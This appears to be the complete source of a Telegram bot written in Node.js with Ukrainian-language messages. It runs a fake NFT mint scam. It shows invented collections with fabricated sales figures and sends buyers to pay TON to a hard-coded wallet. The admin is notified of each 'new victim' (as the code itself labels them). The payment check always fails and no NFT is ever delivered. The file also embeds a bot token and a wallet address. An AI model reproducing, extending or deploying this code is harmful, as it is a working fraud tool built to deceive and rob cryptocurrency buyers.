const { Telegraf } = require('telegraf');
const { Markup } = require('telegraf');

const BOT_TOKEN = '8585183097:AAEAoVSXIGaAfJe52qti3GmrpbtHcYFBY3Y';
const WALLET_TON = 'UQAdqmGgJmCs5vll9d4jNGK5aBFd9LaS3l-gRNuua8jMdbAS';
const ADMIN_ID = 8586263322;

const bot = new Telegraf(BOT_TOKEN);

const collections = [
  {name: "CyberFox Genesis",     supply: "3333",  price1: 3.7,  price5: 17,   emoji: "🦊", sold: 2987},
  {name: "Gnome Land",          supply: "5555",  price1: 4.2,  price5: 19,   emoji: "🧙", sold: 4872},
  {name: "Rich Cats",           supply: "8888",  price1: 5.5,  price5: 25,   emoji: "🐱", sold: 8211},
  {name: "TON Punks",           supply: "10000", price1: 6.9,  price5: 32,   emoji: "👨‍🎤", sold: 9643},
  {name: "Blum Dogs",           supply: "4444",  price1: 2.9,  price5: 13,   emoji: "🐶", sold: 4012},
  {name: "Hamster Kombat NFT",  supply: "7777",  price1: 4.8,  price5: 22,   emoji: "🐹", sold: 7123},
  {name: "NotPixel Heroes",     supply: "9999",  price1: 3.3,  price5: 15,   emoji: "🦸", sold: 9331},
  {name: "Lost Dogs",           supply: "6666",  price1: 7.7,  price5: 35,   emoji: "🥺", sold: 5988},
  {name: "Rocky Rabbit",        supply: "5000",  price1: 3.9,  price5: 18,   emoji: "🐰", sold: 4666},
  {name: "Catizen Cats",        supply: "3333",  price1: 8.8,  price5: 40,   emoji: "😼", sold: 3111},
  {name: "TapSwap Ducks",       supply: "4444",  price1: 2.5,  price5: 11,   emoji: "🦆", sold: 3999},
  {name: "Major Stars",         supply: "8888",  price1: 6.6,  price5: 30,   emoji: "⭐", sold: 8444},
  {name: "X Empire",            supply: "10000", price1: 5.9,  price5: 27,   emoji: "⚔️", sold: 9777},
  {name: "Pixel Foxes",         supply: "2222",  price1: 12.0, price5: 55,   emoji: "🦊", sold: 2198},
  {name: "TON Frogs",           supply: "7777",  price1: 9.9,  price5: 45,   emoji: "🐸", sold: 7555}
];

bot.use(Telegraf.session());

bot.start((ctx) => {
  const col = collections[Math.floor(Math.random() * collections.length)];
  ctx.session.col = col;

  const percent = Math.round(col.sold / col.supply * 100);

  ctx.replyWithHTML(
    `<b>${col.emoji} MINT IS LIVE — ${col.name}</b>\n\n` +
    `Supply: <b>${col.supply}</b> | Замінчено: <b>${col.sold} (${percent}%)</b>\n\n` +
    `Ціна:\n• 1 NFT — <b>${col.price1} TON</b>\n• 5 NFT — <b>${col.price5} TON</b> (знижка)\n\n` +
    `<i>Миттєвий мінт • NFT одразу в гаманці</i>`,
    menu(col)
  );
});

function menu(col) {
  return Markup.inlineKeyboard([
    [Markup.button.callback(`${col.emoji} Mint 1 × ${col.price1} TON`, 'mint1')],
    [Markup.button.callback(`${col.emoji} Mint 5 × ${col.price5} TON`, 'mint5')],
    [Markup.button.callback('My NFTs', 'mynft')]
  ]);
}

bot.action(/mint(\d+)/, async (ctx) => {
  const col = ctx.session.col;
  const count = ctx.match[1] === '5' ? 5 : 1;
  const amount = count === 5 ? col.price5 : col.price1;
  const comment = col.emoji + "NFT" + Math.random().toString(36).slice(2,10).toUpperCase();

  const tonLink = `ton://transfer/${WALLET_TON}?amount=${Math.floor(amount*1000000000)}&text=${comment}`;

  await ctx.editMessageText(
    `${col.emoji} <b>Замовлення ${count} × ${col.name}</b>\n\n` +
    `Сума: <b>${amount} TON</b>\nКоментар: <code>${comment}</code>\n\n` +
    `Гаманець:\n<code>${WALLET_TON}</code>\n\n` +
    `<i>Оплатіть точно з коментарем — NFT прийдуть автоматично</i>`,
    {
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [{ text: 'Оплатити TON', url: tonLink }],
          [{ text: 'USDT / Карта', url: 'https://t.me/CryptoBot?start=pay' }],
          [{ text: 'Перевірити оплату', callback_data: `check_${Date.now()}` }]
        ]
      }
    }
  );

  bot.telegram.sendMessage(ADMIN_ID, `НОВА ЖЕРТВА\nКолекція: ${col.name}\nКількість: ${count}\nСума: ${amount} TON\nКоментар: ${comment}\nЮзер: @${ctx.from.username || 'немає'} (${ctx.from.id})`);
});

bot.action(/check_/, async (ctx) => {
  await ctx.answerCbQuery('Скануємо TON...', { show_alert: true });
  await ctx.editMessageText(`Платіж не знайдено\n\nПеревірте суму та коментар\nСпробуйте ще раз через хвилину`, {
    reply_markup: { inline_keyboard: [[{ text: 'Перевірити знову', callback_data: ctx.callbackQuery.data }]] }
  });
});

bot.action('mynft', (ctx) => {
  const col = ctx.session.col || collections[0];
  ctx.editMessageText(`${col.emoji} Пошук NFT в блокчейні...\n\nНічого не знайдено 😔\nТи ще не замінив`, { reply_markup: menu(col).reply_markup });
});

bot.launch();
console.log('Бот успішно запущено — TON летять на твій гаманець');